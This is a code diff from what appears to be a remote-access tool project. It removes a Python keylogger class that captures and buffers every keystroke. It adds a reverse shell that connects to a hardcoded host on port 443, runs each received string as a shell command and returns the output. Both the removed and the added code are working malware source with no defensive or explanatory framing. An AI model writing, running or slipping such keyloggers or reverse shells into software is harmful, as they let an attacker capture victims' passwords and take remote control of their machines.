@@ -1,51 +1,22 @@
-import threading
-import pynput
+import socket
+import subprocess
 
-from src import errors
+HOST = '192.168.8.146'  
+PORT = 443        
 
-KEY = pynput.keyboard.Key
+def execute_command(command):
+    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return output.stdout.decode() + output.stderr.decode()
 
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        while True:
+            data = s.recv(1024).decode()
+            if not data:
+                break
+            result = execute_command(data)
+            s.sendall(result.encode())
 
-class Keylogger:
-
-    def __init__(self):
-        self.logs = None
-        self.listener = pynput.keyboard.Listener(on_press=self.on_keyboard_evt)
-        self.clear()
-
-    def on_keyboard_evt(self, evt):
-        if evt == KEY.backspace:
-            self.logs += " [Bck] "
-        elif evt == KEY.tab:
-            self.logs += " [Tab] "
-        elif evt == KEY.enter:
-            self.logs += "\n"
-        elif evt == KEY.space:
-            self.logs += " "
-        elif type(evt) == KEY:  # if the character is some other type of special key
-            self.logs += f" [{str(evt)[4:]}] "
-        else:
-            self.logs += f"{evt}"[1:len(str(evt)) - 1]
-
-    def start(self):
-        if not self.listener.running:
-            self.listener.start()
-
-    def stop(self):
-        if self.listener.running:
-            self.listener.stop()
-            threading.Thread.__init__(self.listener)  # re-initialise the thread
-            self.clear()
-        else:
-            raise errors.ClientSocket.KeyloggerError("Listener is not running")
-
-    def dump_logs(self):
-        if self.listener.running:
-            logs = self.logs
-            self.clear()
-            return logs
-        else:
-            raise errors.ClientSocket.KeyloggerError("Listener is not running")
-
-    def clear(self):
-        self.logs = ""
+if __name__ == "__main__":
+    main()
